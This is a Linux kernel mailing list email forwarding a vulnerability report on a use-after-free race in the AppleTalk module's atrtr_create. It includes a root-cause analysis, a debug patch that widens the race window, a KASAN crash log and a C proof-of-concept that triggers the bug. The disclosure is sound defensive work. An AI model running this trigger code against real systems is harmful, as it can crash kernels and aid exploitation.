Return-Path: <netdev+bounces-38742-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [IPv6:2604:1380:45d1:ec00::1])
	by mail.lfdr.de (Postfix) with ESMTPS id D4EDA7BC507
	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 08:36:56 +0200 (CEST)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ny.mirrors.kernel.org (Postfix) with ESMTPS id 02A291C2094F
	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 06:36:56 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 113316FA5;
	Sat,  7 Oct 2023 06:36:54 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; dkim=none
X-Original-To: netdev@vger.kernel.org
Received: from lindbergh.monkeyblade.net (lindbergh.monkeyblade.net [23.128.96.19])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B898D1FCC
	for <netdev@vger.kernel.org>; Sat,  7 Oct 2023 06:36:49 +0000 (UTC)
Received: from 1wt.eu (ded1.1wt.eu [163.172.96.212])
	by lindbergh.monkeyblade.net (Postfix) with ESMTP id EFEDDB9
	for <netdev@vger.kernel.org>; Fri,  6 Oct 2023 23:36:46 -0700 (PDT)
Received: (from willy@localhost)
	by pcw.home.local (8.15.2/8.15.2/Submit) id 3976abQj021168;
	Sat, 7 Oct 2023 08:36:37 +0200
Date: Sat, 7 Oct 2023 08:36:37 +0200
From: Willy Tarreau <w@1wt.eu>
To: netdev@vger.kernel.org
Cc: rootlab@huawei.com
Subject: Fwd: Race Condition Vulnerability in atrtr_create of appletalk
 module leading to UAF
Message-ID: <20231007063637.GS20998@1wt.eu>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.10.1 (2018-07-13)
X-Spam-Status: No, score=-1.9 required=5.0 tests=BAYES_00,
	RCVD_IN_DNSWL_BLOCKED,SPF_HELO_PASS,SPF_PASS autolearn=ham
	autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
	lindbergh.monkeyblade.net

Hello,

Sili Luo of Huawei sent this to the security list. Eric and I think it
does not deserve special handling from the security team and will be
better addressed here.

Regards,
Willy

PS: there are 6 reports for atalk in this series.

----- Forwarded message from rootlab <rootlab@huawei.com> -----

> Date: Sat, 7 Oct 2023 03:09:42 +0000
> From: rootlab <rootlab@huawei.com>
> Subject: Race Condition Vulnerability in atrtr_create of appletalk module  leading to UAF
> To: "security@kernel.org" <security@kernel.org>
> Delivered-To: security@kernel.org
> 
> I recently found an race condition Vulnerability in the atrtr_create, which leads to the kernel access free'd riface object.
> 
> The vulnerability code presented below is located in Linux 6.5-rc5, and it is possible that other versions may also be affected.
> 
> [Root Cause]
> 
> the key code of atrtr_create
> 
> atrtr_create() {
>                 read_lock_bh(&atalk_interfaces_lock);
>                 for (iface = atalk_interfaces; iface; iface = iface->next) {
>                         if (!riface &&
>                             ntohs(ga->sat_addr.s_net) >=
>                                         ntohs(iface->nets.nr_firstnet) &&
>                             ntohs(ga->sat_addr.s_net) <=
>                                         ntohs(iface->nets.nr_lastnet))
>                                 riface = iface;
> 
>                         if (ga->sat_addr.s_net == iface->address.s_net &&
>                             ga->sat_addr.s_node == iface->address.s_node)
>                                 riface = iface;
>                 }
>                 read_unlock_bh(&atalk_interfaces_lock);
> 
>                 devhint = riface->dev; // uaf.
> }
> 
> 
>   1.  atrtr_create first obtains atalk_interfaces_lock
>   2.  Then search for iface from atalk_interfaces
>   3.  Release atalk_interfaces_lock after iface is found.
>   4.  Then access the riface.
> 
> steps to trigger bug:
> 
>   1.  when thread A release atalk_interfaces_lock
>   2.  then thread B enters the atif_drop_device to release the iface.
>   3.  Then thread A will read the riface witch is free'd.
> 
> During atalk_dev_down --> atif_drop_device, the lock held by the thread is an RTNL lock, which is different from the lock of atrtr_create.
> 
> Therefore, the code can be raced.
> 
>                                                      Time
>                                                       +
> thread A                                              |   Thread B
> atrtr_create                                          |   atalk_dev_down
>                                                       |
>                                                       |     1.atrtr_device_down(dev); --> use atalk_routes_lock
>                                                       |       aarp_device_down(dev);
>                                                       |
>  2. write_lock_bh(&atalk_routes_lock);                |
>                                                       |
>                                                       |
>       write_lock_bh(&atalk_interfaces_lock);          |
>         riface = search riface from atalk_interfaces  |
>       read_unlock_bh(&atalk_interfaces_lock);         |
>                                                       |
>                                                       |
>                                                       |
>                                                       |
>                                                       |
>                                                       |     3.atif_drop_device(dev) ---> kfree(iface)
>                                                       |
>                                                       |
>       devhint = riface->dev; --> UAF!                 |
>   4.write_unlock_bh(&atalk_routes_lock);              |
>                                                       +
> 
> 
> [Patch Suggestion]
> 
>   1.  add refcount for struct atalk_route
>   2.  Use the right lock
> 
> [Proof-of-Concept]
> 
> The POC is at the end of the email.
> 
> Test Environment:qemu x86_64 + linux 6.5-rc5 + kasan
> 
> I patched the race part of the code to make sure the driver execute according to the sequence diagram above
> 
> From 0a307baa3334fd7d490ebaa0c70af0930604ff35 Mon Sep 17 00:00:00 2001
> From: luosili <rootlab@huawei.com>
> Date: Wed, 27 Sep 2023 17:29:12 +0800
> Subject: [PATCH] appletalk: patch for race in atrtr_create
> 
> use race_state to control the race code.
> 
> Signed-off-by: luosili <rootlab@huawei.com>
> ---
>  net/appletalk/ddp.c | 20 ++++++++++++++++++++
>  1 file changed, 20 insertions(+)
> 
> diff --git a/net/appletalk/ddp.c b/net/appletalk/ddp.c
> index 8978fb6212ff..555936434000 100644
> --- a/net/appletalk/ddp.c
> +++ b/net/appletalk/ddp.c
> @@ -63,6 +63,7 @@
> 
>  struct datalink_proto *ddp_dl, *aarp_dl;
>  static const struct proto_ops atalk_dgram_ops;
> +volatile static int race_state;
> 
>  /**************************************************************************\
>  *                                                                          *
> @@ -547,6 +548,18 @@ static int atrtr_create(struct rtentry *r, struct net_device *devhint)
>                 if (!riface)
>                         goto out_unlock;
> 
> +               if (ta->sat_addr.s_net == 0x33) {
> +                       printk("vuln: [atrtr_create] %llx\n", (uint64_t)riface);
> +                       while (race_state != 1)
> +                               ;
> +
> +                       race_state = 2;
> +                       printk("vuln: [atrtr_create] 2 %llx\n", (uint64_t)riface);
> +                       while (race_state != 3)
> +                               ;
> +                       printk("vuln: [atrtr_create] 3 %llx\n", (uint64_t)riface);
> +                       race_state = 0;
> +               }
>                 devhint = riface->dev;
>         }
> 
> @@ -629,7 +642,14 @@ static inline void atalk_dev_down(struct net_device *dev)
>  {
>         atrtr_device_down(dev); /* Remove all routes for the device */
>         aarp_device_down(dev);  /* Remove AARP entries for the device */
> +
> +       race_state = 1;
> +       while (race_state != 2) {
> +                       ;
> +       }
> +
>         atif_drop_device(dev);  /* Remove the device */
> +       race_state = 3;
>  }
> 
>  /*
> --
> 2.25.1
> 
> 
> 
> panic log
> 
> 
> # /tmp/atrtr_create
> fd: 3
> SIOCSIFADDR
> 
> [   29.462710] vuln: [atalk_dev_down] 1
> [   29.487942] vuln: [atrtr_create] ffff8880079cb880
> [   29.489063] vuln: [atrtr_create] 2 ffff8880079cb880
> [   29.508598] vuln: [atalk_dev_down] 2
> [   29.509622] vuln: [atalk_dev_down] 3
> [   29.520907] vuln: [atrtr_create] 3 ffff8880079cb880
> [   29.522113] ==================================================================
> [   29.524323] BUG: KASAN: slab-use-after-free in atrtr_create+0x3ae/0x450 [appletalk]
> [   29.525422] Read of size 8 at addr ffff8880079cb880 by task atrtr_create/168
> [   29.526246]
> [   29.526413] CPU: 1 PID: 168 Comm: atrtr_create Tainted: G           OE      6.5.0-rc5 #7
> [   29.527195] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
> [   29.528212] Call Trace:
> [   29.528501]  <TASK>
> [   29.528765]  dump_stack_lvl+0x4c/0x70
> [   29.529208]  print_report+0xd3/0x620
> [   29.529638]  ? kasan_complete_mode_report_info+0x7d/0x200
> [   29.530247]  ? atrtr_create+0x3ae/0x450 [appletalk]
> [   29.530782]  kasan_report+0xc2/0x100
> [   29.531167]  ? atrtr_create+0x3ae/0x450 [appletalk]
> [   29.531726]  __asan_load8+0x82/0xb0
> [   29.532122]  atrtr_create+0x3ae/0x450 [appletalk]
> [   29.532661]  atrtr_ioctl_addrt+0xe5/0xf0 [appletalk]
> [   29.533234]  ? __pfx_atrtr_ioctl_addrt+0x10/0x10 [appletalk]
> [   29.533892]  ? __kasan_check_write+0x18/0x20
> [   29.534406]  ? _copy_from_user+0x4a/0x90
> [   29.534892]  atrtr_ioctl+0x101/0x110 [appletalk]
> [   29.535499]  ? __pfx_atrtr_ioctl+0x10/0x10 [appletalk]
> [   29.536155]  ? ns_capable_common+0x5b/0x90
> [   29.536515]  atalk_ioctl+0x17c/0x1e0 [appletalk]
> [   29.536866]  sock_do_ioctl+0xb9/0x1a0
> [   29.537331]  ? __pfx_sock_do_ioctl+0x10/0x10
> [   29.537832]  ? do_vfs_ioctl+0x5f1/0xd00
> [   29.538301]  ? __pfx_hrtimer_nanosleep+0x10/0x10
> [   29.538856]  ? __pfx_do_vfs_ioctl+0x10/0x10
> [   29.539354]  ? __pfx_hrtimer_wakeup+0x10/0x10
> [   29.539930]  ? get_timespec64+0xb6/0x110
> [   29.540397]  sock_ioctl+0x1b1/0x420
> [   29.540828]  ? common_nsleep+0x6b/0x80
> [   29.541274]  ? __pfx_sock_ioctl+0x10/0x10
> [   29.541750]  ? __rcu_read_unlock+0x5b/0x280
> [   29.542257]  ? __fget_light+0x1ca/0x1f0
> [   29.542712]  __x64_sys_ioctl+0xd1/0x110
> [   29.543153]  do_syscall_64+0x60/0x90
> [   29.543585]  ? syscall_exit_to_user_mode+0x2a/0x50
> [   29.544130]  ? ret_from_fork+0x2d/0x70
> [   29.544576]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [   29.545202] RIP: 0033:0x45d96b
> [   29.545578] Code: 0f 92 c0 84 c0 75 b0 49 8d 3c 1c e8 0f 95 02 00 85 c0 78 b1 48 83 c4 08 4c 89 e0 5b 41 5c c3 f3 0f 1e fa b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
> [   29.547174] RSP: 002b:00007f425fa7acc8 EFLAGS: 00000202 ORIG_RAX: 0000000000000010
> [   29.547982] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 000000000045d96b
> [   29.548734] RDX: 00007f425fa7ad20 RSI: 000000000000890b RDI: 0000000000000003
> [   29.549494] RBP: 00007f425fa7adb0 R08: 0000000000000000 R09: 00007f425fa7b700
> [   29.550238] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffc1a61bb0e
> [   29.550958] R13: 00007ffc1a61bb0f R14: 00007ffc1a61bb10 R15: 00007f425fa7ae80
> [   29.551683]  </TASK>
> [   29.551931]
> [   29.552116] Allocated by task 166:
> [   29.552517]  kasan_save_stack+0x2a/0x50
> [   29.552978]  kasan_set_track+0x29/0x40
> [   29.553372]  kasan_save_alloc_info+0x1f/0x30
> [   29.553823]  __kasan_kmalloc+0xb5/0xc0
> [   29.554245]  kmalloc_trace+0x4e/0xb0
> [   29.554660]  atif_add_device+0x3a/0x100 [appletalk]
> [   29.555190]  atif_ioctl+0x63b/0x710 [appletalk]
> [   29.555702]  atalk_ioctl+0x124/0x1e0 [appletalk]
> [   29.556252]  sock_do_ioctl+0xb9/0x1a0
> [   29.556669]  sock_ioctl+0x1b1/0x420
> [   29.556955]  __x64_sys_ioctl+0xd1/0x110
> [   29.557279]  do_syscall_64+0x60/0x90
> [   29.557667]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [   29.558215]
> [   29.558380] Freed by task 167:
> [   29.558709]  kasan_save_stack+0x2a/0x50
> [   29.559121]  kasan_set_track+0x29/0x40
> [   29.559510]  kasan_save_free_info+0x2f/0x50
> [   29.559936]  __kasan_slab_free+0x12e/0x1c0
> [   29.560362]  __kmem_cache_free+0x1b9/0x380
> [   29.560808]  kfree+0x7a/0x120
> [   29.561150]  atif_drop_device+0xb1/0x100 [appletalk]
> [   29.561684]  atif_ioctl+0x21c/0x710 [appletalk]
> [   29.562159]  atalk_ioctl+0x124/0x1e0 [appletalk]
> [   29.562640]  sock_do_ioctl+0xb9/0x1a0
> [   29.563051]  sock_ioctl+0x1b1/0x420
> [   29.563433]  __x64_sys_ioctl+0xd1/0x110
> [   29.563833]  do_syscall_64+0x60/0x90
> [   29.564214]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [   29.564745]
> [   29.564915] The buggy address belongs to the object at ffff8880079cb880
> [   29.564915]  which belongs to the cache kmalloc-32 of size 32
> [   29.566330] The buggy address is located 0 bytes inside of
> [   29.566330]  freed 32-byte region [ffff8880079cb880, ffff8880079cb8a0)
> [   29.567344]
> [   29.567460] The buggy address belongs to the physical page:
> [   29.567984] page:00000000aebdeb15 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x79cb
> [   29.568920] flags: 0xfffffc0000200(slab|node=0|zone=1|lastcpupid=0x1fffff)
> [   29.569630] page_type: 0xffffffff()
> [   29.570014] raw: 000fffffc0000200 ffff888006842500 dead000000000100 dead000000000122
> [   29.570844] raw: 0000000000000000 0000000080400040 00000001ffffffff 0000000000000000
> [   29.571714] page dumped because: kasan: bad access detected
> [   29.572314]
> [   29.572487] Memory state around the buggy address:
> [   29.573093]  ffff8880079cb780: fa fb fb fb fc fc fc fc 00 00 00 fc fc fc fc fc
> [   29.573939]  ffff8880079cb800: fb fb fb fb fc fc fc fc fa fb fb fb fc fc fc fc
> [   29.574772] >ffff8880079cb880: fa fb fb fb fc fc fc fc 00 00 00 fc fc fc fc fc
> [   29.575596]                    ^
> [   29.575936]  ffff8880079cb900: fb fb fb fb fc fc fc fc fb fb fb fb fc fc fc fc
> [   29.576669]  ffff8880079cb980: 00 00 00 fc fc fc fc fc fb fb fb fb fc fc fc fc
> [   29.577333] ==================================================================
> [   29.578070] Disabling lock debugging due to kernel taint
> 
> 
> [CREDIT]
> 
> Sili Luo
> RO0T Lab of Huawei
> 
> poc
> 
> #define _GNU_SOURCE
> #include <errno.h>
> #include <fcntl.h>
> #include <linux/if_tun.h>
> #include <linux/atalk.h>
> #include <net/if.h>
> #include <pthread.h>
> #include <sched.h>
> #include <stdio.h>
> #include <string.h>
> #include <sys/ioctl.h>
> #include <sys/socket.h>
> #include <sys/stat.h>
> #include <sys/types.h>
> #include <time.h>
> #include <unistd.h>
> 
> 
> #include <linux/if_ether.h>
> #include <linux/if_packet.h>
> #include <linux/if_x25.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <unistd.h>
> 
> #include <linux/if_ether.h>
> #include <linux/if_packet.h>
> #include <linux/if_x25.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <unistd.h>
> 
> #include <arpa/inet.h>
> #include <linux/if_packet.h>
> #include <net/ethernet.h>
> #include <netinet/if_ether.h>
> #include <netinet/in.h>
> #include <netinet/ip.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <net/route.h>
> 
> 
> void pincpu(int cpu) {
>   cpu_set_t set;
>   CPU_ZERO(&set);
>   CPU_SET(cpu, &set);
>   if (sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0) {
>     perror("setaffinity");
>   }
> }
> 
> int at_fd;
> 
> #define THREAD_NUMS 2
> pthread_barrier_t barrier;
> 
> void free_thread() {
>   pincpu(0);
> 
>   srand(time(NULL));
> 
> 
> 
>   struct ifreq atreq;
>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
> 
>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
> 
>   sa->sat_family = AF_APPLETALK;
>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
>   nr->nr_phase = 2;
>   sa->sat_addr.s_node = 3;
>   sa->sat_addr.s_net = 12;
> 
>   ioctl(at_fd, SIOCDIFADDR, &atreq);
> }
> 
> void use_thread() {
>   pincpu(1);
>   struct ifreq atreq;
>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
> 
>   usleep(25000);
> 
> 
>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
> 
>   sa->sat_family = AF_APPLETALK;
>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
>   nr->nr_phase = 2;
>   sa->sat_addr.s_node = 3;
>   sa->sat_addr.s_net = 12;
> 
> 
>   struct rtentry rt = {0};
>   char name[] = "lo";
>   rt.rt_dev = NULL;
> 
>         struct sockaddr_at *ta = (struct sockaddr_at *)&rt.rt_dst;
>         struct sockaddr_at *ga = (struct sockaddr_at *)&rt.rt_gateway;
>   ta->sat_family = AF_APPLETALK;
>   ga->sat_family = AF_APPLETALK;
>   ta->sat_addr.s_net = 0x33;
>   ta->sat_addr.s_node = 0x32;
>   ga->sat_addr = sa->sat_addr;
>   ioctl(at_fd, SIOCADDRT, &rt);
> }
> 
> int main() {
> 
>   at_fd = socket(PF_APPLETALK, SOCK_DGRAM, 0);
>   printf("fd: %d\n", at_fd);
> 
>   struct ifreq atreq;
>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
> 
>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
> 
>   sa->sat_family = AF_APPLETALK;
>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
>   nr->nr_phase = 2;
>   sa->sat_addr.s_node = 3;
>   sa->sat_addr.s_net = 12;
> 
>   ioctl(at_fd, SIOCSIFADDR, &atreq);
> 
>   puts("SIOCSIFADDR");
>   getchar();
> 
> 
> 
>   // puts("use done");
>   // return;
> 
>   pthread_barrier_init(&barrier, NULL, THREAD_NUMS);
> 
>   pthread_t ids[2] = {0};
>   pthread_create(&ids[0], NULL, (void *)free_thread, NULL);
>   pthread_create(&ids[1], NULL, (void *)use_thread, NULL);
> 
>   pthread_join(ids[0], NULL);
>   pthread_join(ids[1], NULL);
> 
>   sleep(1);
> }
> 
> 

----- End forwarded message -----

